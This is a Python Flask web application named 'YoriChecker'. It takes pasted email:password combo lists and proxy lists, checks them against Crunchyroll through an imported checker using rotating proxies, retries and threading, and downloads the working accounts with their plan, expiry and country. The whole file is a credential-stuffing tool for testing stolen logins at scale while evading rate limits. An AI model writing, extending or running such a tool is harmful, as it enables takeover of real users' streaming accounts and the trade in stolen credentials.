import io
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, render_template_string, send_file, jsonify
from checker import CrunchyrollChecker

app = Flask(__name__)

class ProxyManager:
    def __init__(self, proxies):
        self.proxies = [p.strip() for p in proxies if p.strip()]
        self.index = 0
        self.lock = __import__('threading').Lock()

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

    def mark_bad(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YoriChecker</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #e0e0e0; padding: 20px; }
        h1 { color: #ff7b00; }
        textarea { width: 100%; height: 150px; background: #2d2d2d; color: #fff; border: 1px solid #444; padding: 10px; margin-bottom: 10px; }
        button { background: #ff7b00; color: white; border: none; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 4px; }
        button:disabled { background: #666; cursor: not-allowed; }
        #status { margin-top: 20px; font-weight: bold; color: #00ff00; }
        .spinner { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ff7b00; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-top: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>YoriChecker</h1>
    <label>Combos (email:password)</label>
    <textarea id="combos" placeholder="email:pass&#10;email2:pass2"></textarea>
    
    <label>Proxies (ip:port:user:pass or ip:port)</label>
    <textarea id="proxies" placeholder="127.0.0.1:8080&#10;192.168.1.1:3128:user:pass"></textarea>
    
    <button id="validateBtn" onclick="validate()">Validate</button>
    <div id="spinner" class="spinner"></div>
    <div id="status"></div>

    <script>
        async function validate() {
            const btn = document.getElementById('validateBtn');
            const spinner = document.getElementById('spinner');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            spinner.style.display = 'block';
            status.innerText = 'Processing... please wait.';
            status.style.color = '#ffcc00';

            const combos = document.getElementById('combos').value;
            const proxies = document.getElementById('proxies').value;

            try {
                const response = await fetch('/validate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ combos, proxies })
                });

                if (!response.ok) throw new Error('Server error');
                
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'YoriChecker.vercel.app.txt';
                document.body.appendChild(a);
                a.click();
                a.remove();
                
                status.innerText = 'Done! File downloaded.';
                status.style.color = '#00ff00';
            } catch (err) {
                status.innerText = 'Error: ' + err.message;
                status.style.color = '#ff0000';
            } finally {
                btn.disabled = false;
                spinner.style.display = 'none';
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/validate', methods=['POST'])
def validate():
    data = request.json
    combos_raw = data.get('combos', '').split('\n')
    proxies_raw = data.get('proxies', '').split('\n')
    
    combos = [c.strip() for c in combos_raw if ':' in c]
    
    proxy_mgr = ProxyManager(proxies_raw)
    checker = CrunchyrollChecker(proxy_manager=proxy_mgr)
    
    results = []

    def process_combo(combo):
        email, password = combo.split(':', 1)
        attempts = 0
        max_attempts = 3
        
        while attempts < max_attempts:
            proxy = proxy_mgr.get_proxy()
            # Temporarily set proxy on checker instance if needed, or pass it
            # For this architecture we assume checker handles it or we pass it in
            result = checker.check_account(email, password)
            
            if result.get('status') == 'ERROR' and 'proxy' in result.get('error', '').lower():
                if proxy:
                    proxy_mgr.mark_bad(proxy)
                attempts += 1
                continue
            return result
        return {'status': 'ERROR', 'error': 'Max proxy attempts reached'}

    with ThreadPoolExecutor(max_workers=5) as executor:
        results = list(executor.map(process_combo, combos))

    hits = [r for r in results if r.get('status') == 'HIT']
    
    output = io.StringIO()
    for hit in hits:
        d = hit.get('data', {})
        line = f"{d.get('user', 'N/A')}|{d.get('plan', 'N/A')}|{d.get('expires', 'N/A')}|{d.get('country', 'N/A')}\n"
        output.write(line)
        
    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode('utf-8')),
        mimetype='application/octet-stream',
        as_attachment=True,
        download_name='YoriChecker.vercel.app.txt'
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
